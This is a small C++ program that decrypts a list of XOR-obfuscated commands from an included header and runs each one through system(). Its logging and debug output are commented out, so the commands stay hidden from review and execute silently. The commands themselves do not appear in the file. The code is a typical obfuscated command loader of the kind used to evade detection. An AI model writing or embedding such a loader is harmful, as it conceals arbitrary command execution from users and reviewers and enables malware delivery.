#include "data.h" // Include the header with encrypted data
#include <cstdlib> // For system()
#include <iostream>
#include "xor.cpp"

// Reuse the XOR encryption/decryption function
std::string xorEncryptDecrypt(const std::string& input, char key) {
    std::string output = input;
    for (size_t i = 0; i < input.size(); ++i) {
        output[i] = input[i] ^ key;
    }
    return output;
}

int main() {
    char key = 'X'; // Must use the same key for decryption

    for (const auto& encryptedCmd : encryptedCommands) {
        std::string command = xorEncryptDecrypt(encryptedCmd, key);
        // std::cout << "Encrypted: " << encryptedCmd << '\n'; // Debugging line
        // std::cout << "Decrypted: " << command << '\n'; // Debugging line
        // std::cout << "Executing: " << command << '\n';
        int result = system(command.c_str());
        // if (result != 0) {
        //     std::cerr << "Command failed: " << command << '\n';
        // }
    }

    return 0;
}